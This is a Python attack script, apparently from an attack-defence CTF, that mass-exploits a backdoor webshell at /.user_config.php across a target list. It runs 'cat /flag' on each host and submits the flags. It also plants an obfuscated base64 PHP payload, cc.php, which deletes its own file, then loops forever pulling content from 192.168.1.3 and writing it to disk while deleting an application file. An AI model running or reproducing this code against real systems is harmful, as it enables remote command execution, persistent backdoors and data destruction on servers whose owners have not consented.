from lib.parseburplog import parseburprequest
from core.common import repeat
from core.data import conf
from lib.submit_flag import submit_flag
import requests
from core.data import *
import re



def getflag():  #获取flag并自动提交，通过webshell来获取flag
    uri = "/.user_config.php"  #shell地址
    header = {
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
	}
    data = "pass=WJdhNWqs&cmd=system('cat /flag');"
    #data = "cmd=system('cat /flag');"
    with open('web_targets.txt', 'r') as f:
        targets = f.readlines()
        for target in targets:
            target = target.strip()
            url = "http://" + target + uri
            try:
                res = requests.post(url, headers=header, data=data,timeout=1)
                submit_flag(res)
            except Exception as f:
                print(f)
                print(url + "\tshell未上传成功\n")


def webshell():   #获取webshell
    uri = "/.user_config.php"
    header = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
        "Referer": ''''''
    }
    poc = "echo -n 'PD9waHAgCglzZXRfdGltZV9saW1pdCgwKTsKCWVycm9yX3JlcG9ydGluZygwKTsKCXVubGluayhfX0ZJTEVfXyk7Cgl3aGlsZSgxKXsKCQlmaWxlX3B1dF9jb250ZW50cyhmaWxlX2dldF9jb250ZW50cygnaHR0cDovLzE5Mi4xNjguMS4zLzEudHh0JyksZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly8xOTIuMTY4LjEuMy8yLnR4dCcpKTsKCQkvL3VzbGVlcCg1MDAwKTsKCQlzbGVlcCgxKTsKCQkkZmlsZSA9ICcvdmFyL3d3dy9odG1sL2FwcGxpY2F0aW9uL2NvbW1vbi5waHAnOwoJCWlmKGZpbGVfZXhpc3RzKCRmaWxlKSl7CgkJCXVubGluaygkZmlsZSk7CgkJfQoJfQo/Pg==' |base64 -d >>//var/www/html/cc.php"
    with open('web_targets.txt', 'r') as f:
        targets = f.readlines()

        for target in targets:
            target = target.strip()
            #data = 'c=system("{}");'.format(poc)
            url = "http://" + target + uri
            print(url)
            data = "pass=WJdhNWqs&cmd=system('{}');".format(poc)
            res = requests.post(url, headers=header, data=data)
            url2 = "http://" + target + "/cc.php"
            try:
                res2 = requests.get(url2, timeout=1)
                if res2.status_code == 200:
                    print('上传shell成功：' + url2)
            except Exception as e:
                pass

